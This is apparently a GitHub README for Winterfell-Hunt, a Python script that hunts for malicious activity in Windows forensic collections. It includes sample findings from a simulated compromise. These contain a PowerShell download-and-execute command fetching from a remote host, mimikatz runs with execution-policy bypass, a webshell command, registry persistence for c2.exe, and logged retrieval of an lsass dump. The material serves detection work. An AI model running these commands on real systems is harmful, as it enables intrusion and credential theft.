<img src="https://github.com/yasser-alghamdi/winterfell-hunt/blob/master/winterfell-hunt.png" title="winterfell" height="15%" width="35%">

# Winterfell-Hunt
Winterfell-Hunt is a python script to perform auto threat hunting for malicious activities in windows OS based on collected data by winterfell collection package https://github.com/yasser-alghamdi/winterfell-collection.

## Winterfell-Hunt Capabilities
Winterfell-Hunt helps to reduce the size of collected data by Winterfell collection package based on performing strings/regex matching of common malicious strings, locations, techniques, etc in order to expedite the time of investigation. it covers the following functions `amcache_hunt` `shellbags_hunt` `prefetch_hunt` `security_logs_hunt` `powershell_logs_hunt` `autoruns_hunt` `schedule_tasks_hunt` `firewall_hunt` `dlls_hunt` `usnjrnl_hunt` `recycle_bin_hunt` `loki_process_hunt` `loki_file_hunt` `URL_history_hunt` `dirlisting_hunt` `iis_logs_hunt` `registry_CURRENT_USER_hunt` and `registry_LOCAL_MACHINE_hunt`

## Winterfell-Hunt Usage
After finishing the usage of winterfell-collection execution, a folder named by the collected machine name will be generated (e.x. DESKTOP-YASSER). Make sure to move that folder to be part of winterfell-hunt folder which contain winhunt.py script to start executing the threat hunting exercise. you can run the script by execute `# winhunt.py {name_of_collected_machine_folder}` through administrator command prompt `cmd.exe`.

```
██╗    ██╗██╗███╗   ██╗████████╗███████╗██████╗ ███████╗███████╗██╗     ██╗     
██║    ██║██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗██╔════╝██╔════╝██║     ██║     
██║ █╗ ██║██║██╔██╗ ██║   ██║   █████╗  ██████╔╝█████╗  █████╗  ██║     ██║     
██║███╗██║██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗██╔══╝  ██╔══╝  ██║     ██║     
╚███╔███╔╝██║██║ ╚████║   ██║   ███████╗██║  ██║██║     ███████╗███████╗███████╗
╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚══════╝╚══════╝
                                                                                  
██╗  ██╗██╗   ██╗███╗   ██╗████████╗                                            
██║  ██║██║   ██║████╗  ██║╚══██╔══╝                                            
███████║██║   ██║██╔██╗ ██║   ██║                                               
██╔══██║██║   ██║██║╚██╗██║   ██║                                               
██║  ██║╚██████╔╝██║ ╚████║   ██║

+----------------------------------------------------------------------------------+
| Description   : Hunt for malicious activities in windows OS based on collected   |
|                 data by winterfell collection package. refer to :                |
|                 https://github.com/yasser-alghamdi/winterfell-collection         |
| Author        : yAsSeR Al-Ghamdi                                                 |
| Version       : 1.0                                                              |
| Github        : yasser-alghamdi                                                  |
| Twitter       : @Yasser_J_Gh                                                     |
+----------------------------------------------------------------------------------+

Command :
        # winhunt.py {name_of_collected_machine_folder}
        # winhunt.py DESKTOP-YASSER
```

at the end, a report of each execution will be generated contains all finidings loacted at the following PATH *\DESKTOP-YASSER\Hunting\Winterfell_Hunt_Report.txt*
to present the overall findings that need additional attention and further investigation.

```
██╗  ██╗██╗   ██╗███╗   ██╗████████╗    ██████╗ ███████╗██████╗  ██████╗ ██████╗ ████████╗
██║  ██║██║   ██║████╗  ██║╚══██╔══╝    ██╔══██╗██╔════╝██╔══██╗██╔═══██╗██╔══██╗╚══██╔══╝
███████║██║   ██║██╔██╗ ██║   ██║       ██████╔╝█████╗  ██████╔╝██║   ██║██████╔╝   ██║
██╔══██║██║   ██║██║╚██╗██║   ██║       ██╔══██╗██╔══╝  ██╔═══╝ ██║   ██║██╔══██╗   ██║
██║  ██║╚██████╔╝██║ ╚████║   ██║       ██║  ██║███████╗██║     ╚██████╔╝██║  ██║   ██║
╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝       ╚═╝  ╚═╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝                                                                                                                                      

Winterfell hunt has completed. Full report is loacted at DESKTOP-YASSER\Hunting\Winterfell_Hunt_Report.txt
Results statstics are the following:
------------------------------------
Total Findings Count:
602
------------------------------------
Amcache Findings Count:
18
------------------------------------
Shellbags Findings Count:
35
------------------------------------
Powershell Findings Count:
6
------------------------------------
Firewall Findings Count:
3
------------------------------------
Dlls Findings Count:
90
------------------------------------
Recycle Bin Findings Count:
1
------------------------------------
Prefetch Findings Count:
2
------------------------------------
Security Logs Findings Count:
3
------------------------------------
Autoruns Findings Count:
9
------------------------------------
Schedule Task Findings Count:
3
------------------------------------
UsnJrnl Findings Count:
139
------------------------------------
Loki ProcessScan Findings Count:
23
------------------------------------
Loki FileScan Findings Count:
69
------------------------------------
IIS Findings Count:
12
------------------------------------
URL History Findings Count:
1
------------------------------------
Dirlisting Findings Count:
63
------------------------------------
LOCAL_MACHINE Registry Findings Count:
121
------------------------------------
CURRENT_USER Registry Findings Count:
4
```

## Demo of Execution
below is to domenstrate a demo of execution of Winterfell-Hunt as the following:

**Run Winterfell Package**
![Run_Winterfell](https://github.com/yasser-alghamdi/winterfell/blob/master/winterfell.gif?raw=true)

**DESKTOP-YASSER POC**

After executed winterfell-collection package targeting DESKTOP-YASSER machine as part of proof of concept, I have run `winhunt.py` on the collected data to show the value of reducing the size of data and capture most of malicious activities that were injected to the machine as part of sumliation. 

below table to show the reduced size statistics as the following:
Collected Data 		     | Original File (lines)  | Winterfell-Hunt (lines)
--------------------   | --------------------   | --------------------
Amcache                | 441                    | 18
ShellBags              | 757                    | 35
Prefetch               | 242                    | 2
Security_logs          | 236015                 | 3
Powershell_logs        | 101649                 | 6
Autoruns               | 16549                  | 9
Schedule_task          | 1044                   | 3
Firewall	             | 9249                   | 3
Dlls                   | 46265                  | 90
UsnJrnl                | 4732675                | 139
Recycle_bin            | 96                     | 1
Loki_process           | 302                    | 23
Loki_File              | 73                     | 69
URL_history            | 58                     | 1
Dirlisting             | 568336                 | 63
iis_logs               | 110321                 | 12
registry_CURRENT_USER  | 32091                  | 4
registry_LOCAL_MACHINE | 619013                 | 121
Total                  | 6475176                | 602

**Examples of Detected Malicious Activities**
below are samples of detected malicious activities extracted by winterfell-hunt during the execution targeting DESKTOP-YASSER machine:
```
[+] Hunting in Amcache File:
1	0	C:\Users\yasser\Desktop\Tools\5.exe	2019-01-08 04:14:28	NA

[+] Hunting in Amcache File:
1	1	C:\Users\yasser\Desktop\Tools\m.exe	2015-05-21 05:45:44	NA
[+] Hunting in Amcache File:
1	3	C:\Users\Public\c2.exe	2018-01-24 13:19:52	NA

[+] Hunting in Amcache File:
1	4	C:\Windows\Temp\malicious.exe	2018-04-06 09:56:44	NA

[+] Hunting in Amcache File:
1	5	C:\ProgramData\mimikatz.exe	2018-04-06 09:56:44	NA

[+] Hunting in Amcache File:
1	9	C:\Tools\malicious.bat	2018-11-06 14:17:38	NA

[+] Hunting in Shellbags File:
BagMRU\15\0	1	249	1	Desktop\c2\tools\webshell.aspx	File	webshell.aspx	0	2018-12-26 07:52:58	2018-12-26 07:52:58	2018-12-26 07:52:58		414761	5	1			NTFS file system

[+] Hunting in Shellbags File:
BagMRU\15\1	0	250	1	Desktop\c2\tools\1.zip	File	1.zip	0	2018-12-26 07:54:32	2018-12-24 13:42:34	2018-12-26 07:54:32		414770	5	1			NTFS file system

[+] Hunting in Shellbags File:
BagMRU\21	0	331	5	Desktop\C:\\ProgramData\	Directory	Tools	1	2018-06-17 13:57:14	2018-12-27 09:21:22	2019-01-13 07:41:20		78691	3	1			NTFS file system

[+] Hunting in Shellbags File:
BagMRU\21\0	1	343	3	Desktop\C:\\ProgramData\malicious.ps1	File	malicious.ps1	0	2019-01-13 12:32:44	2019-01-13 08:08:38	2019-01-13 12:51:22		181	20	1			NTFS file system

[+] Hunting in Security Logs:
	New Process Name:	C:\Windows\ProgramData\evil.exe

[+] Hunting in Security Logs:
	New Process Name:	C:\Windows\Temp\malicious.exe

[+] Hunting in Powershell Logs Files:
        Host Application = PowerShell -exec bypass Invoke-mimikatz.ps1

[+] Hunting in Powershell Logs Files:
        Host Application = powershell -nop -Command IEX (New-Object System.Net.WebClient).DownloadString('https://yasser.com/qwesd') 

[+] Hunting in Powershell Logs Files:
        Host Application = PowerShell -exec bypass Exploit-Yasser.ps1

[+] Hunting in Powershell Logs Files:
	Host Application = PowerShell -exec bypass PowerUp.ps1
  
 [+] Hunting in Schedule Tasks:
DESKTOP-Yasser  Malicious			          2/21/2020 6:00:00 PM   Ready           Interactive/Background  2/21/2020 3:51:56 PM              0 Microsoft Corpor wscript /b C:\Users\Public\malicious.vbs                 N/A                                      malicious								   Impr Enabled                Disabled                                                                                  SYSTEM                                   Disabled                       72:00:00                                 Scheduling data is not available in this format.                                 One Time Only, Hourly        12:00:00 AM  1/2/2004   N/A        N/A                                         N/A                                         6 Hour(s), 0 Minute(s)   None                 Disabled                       Disabled                           

[+] Hunting in Dlls File:
0x00000000d54d0000  0x1e1000  C:\WINDOWS\Temp\bad.dll

[+] Hunting in Loki ProcessScan Module:
20200221T08:51:10Z DESKTOP-P4HMK0S LOKI: Info: MODULE: ProcessScan MESSAGE: Scanning Process PID: 840 NAME: powershell.exe OWNER: UMFD-1 CMD: C:\WINDOWS\system32\powershell.exe -nop -Command IEX (New-Object System.Net.WebClient).DownloadString('https://yasser.com/qwesd')  PATH: C:\WINDOWS\system32\powershell.exe

[+] Hunting in Loki FileScan Module:
20200221T09:00:19Z DESKTOP-P4HMK0S LOKI: Warning: MODULE: FileScan MESSAGE: FILE: C:\Windows\Temp\malicious.exe SCORE: 100 TYPE: UNKNOWN SIZE: 76382 FIRST_BYTES: 230a23204c4f4b492046696c65204e616d652043 / ## LOKI File Name C MD5: 297f795856fa2ca1602ede9a04e17d35 SHA1: 9ce134961dbe8f72871cb69b6dd2e8bf92b615e8 SHA256: 66e0b0953779e17b5a02a6baee0827a76a3af4153acf774d8a4c7043059066e8 CREATED: Fri Feb 21 17:18:08 2020 MODIFIED: Mon Oct 28 20:13:14 2019 ACCESSED: Fri Feb 21 18:00:19 2020 REASON_1: Yara Rule MATCH: FVEY_ShadowBroker_Auct_Dez16_Strings SUBSCORE: 100 DESCRIPTION: String from the ShodowBroker Files Screenshots - Dec 2016 REF: https://bit.no.com:43110/theshadowbrokers.bit/post/message6/ MATCHES: Str1: elatedmonkey Str2: endlessdonut Str3: catflap Str4: charm_penguin Str5: charm_hammer Str6: dampcrowd Str7: ebbshave Str8: eggbasket S ... (truncated)

[+] Hunting in URL History Data:
file:///C:/Users/yasser/Desktop/c2/webshell.aspx,,2/21/2020 8:35:17 AM,1,,,Internet Explorer 10/11 / Edge,taro,,49,,C:\Users\yasser\AppData\Local\Microsoft\Windows\WebCache\WebCacheV01.dat,79

[+] Hunting in IIS Files:
2020-08-23 00:00:01 123.12.12.12 POST /Microsoft-Server-ActiveSync/error.aspx cmd=whomai&User=vvvvv&DeviceId=7f5c3228efb748deb692dd060fd3c3fa&DeviceType=Outlook&CorrelationID=<empty>;&ClientId=LUMKUABYKITWVQUDKIW&cafeReqId=25e9a70d-a181-4280-85ae-137e9e7aa461; 443 - 40.96.39.253 Outlook-iOS-Android/1.0 - 401 2 5 171

[+] Hunting in IIS Files:
2020-08-23 00:00:12 123.12.12.12 POST /Microsoft-Server-ActiveSync/error.aspx file=test.pdf&User=ssss&DeviceId=7f5c3228efb748deb692dd060fd3c3fa&DeviceType=Outlook&CorrelationID=<empty>;&ClientId=IXSDYEKKKMXCQMXKIJW&cafeReqId=f093152f-ffd3-4bae-a188-e0b67aa0d40b; 443 vendorcare@test.com 40.96.41.69 Outlook-iOS-Android/1.0 - 200 0 0 748

[+] Hunting in IIS Files:
2020-08-23 00:00:13 123.12.12.12 GET /1/default.zip User=mmm&DeviceId=MTJ0ERHOAD0KR2URRVQOAKM100&DeviceType=iPhone&Cmd=FolderSync&CorrelationID=<empty>;&ClientId=QVPWMBQEUUKQPS0QJ0GGG&cafeReqId=1cfd82d3-77a1-439a-ba97-f9d1e851888d; 443 abcd.gov.sa\ssssss 176.44.223.229 Apple-iPhone8C2/1607.77 - 200 0 0 46

[+] Hunting in IIS Files:
2020-08-23 00:00:14 123.12.12.12 GET /1/data.rar User=abcd%5Cyyyyyyy&DeviceId=A22CB4E2A3FC056D&DeviceType=Outlook&Cmd=Ping&CorrelationID=<empty>;&ClientId=QUGGOGWA0EWUJNFZOIQ&cafeReqId=f6e338fd-083d-421f-8bf6-7860358aa833; 443 abcd\ssssss 52.125.129.23 Outlook-iOS-Android/1.0 - 200 0 0 540277

[+] Hunting in IIS Files:
2020-08-23 00:00:16 123.12.12.12 GET /1/CEO.pst User=mmm&DeviceId=Q4LRVNVQ5P7UB269033H96IU3S&DeviceType=iPhone&Cmd=Ping&CorrelationID=<empty>;&ClientId=KCQZNUAYKGNOXQUZABNVW&cafeReqId=eba3262a-2abd-4152-a955-c3a7ea13398a; 443 abcd.gov.sa\ssssss 93.168.240.238 Apple-iPhone10C5/1606.250 - 200 0 0 104898

[+] Hunting in IIS Files:
2020-08-23 00:23:38 123.12.12.12 GET /1/lssas.dmp User=mmm&DeviceId=MTJ0ERHOAD0KR2URRVQOAKM100&DeviceType=iPhone&Cmd=Settings&CorrelationID=<empty>;&ClientId=QVPWMBQEUUKQPS0QJ0GGG&cafeReqId=68aa739c-a3ba-411e-a130-408241913e0d; 443 abcd.gov.sa\sssss 188.44.228.228 Apple-iPhone8C2/1607.77 - 200 0 0 622020-08-23 00:23:38 123.12.12.12 POST /owa/service.svc action=SubscribeToNotification&UA=0&ID=-3&AC=1&CorrelationID=7cf213ff-4a7c-4745-bed6-92562ba11ee5_156651977845903;&ClientId=OWXJSXW0YWITCQBJQ&cafeReqId=36ace11a-78b9-471e-8f2d-2a13513264fd; 443 Azzzzzz 68.36.74.53 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+12_1_2+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/12.0+Mobile/15E148+Safari/604.1https://wenmail.test.com/owa/ 200 0 0 327

[+] Hunting in CURRENT_USER Registry:
"Evail"="\"C:\\ProgramData\\c2.exe\" /background"

[+] Hunting in LOCAL_MACHINE Registry:
"Evail"="\"C:\\ProgramData\\c2.exe" /background"
```


## References

https://ericzimmerman.github.io/#!index.md

https://www.nirsoft.net/utils/
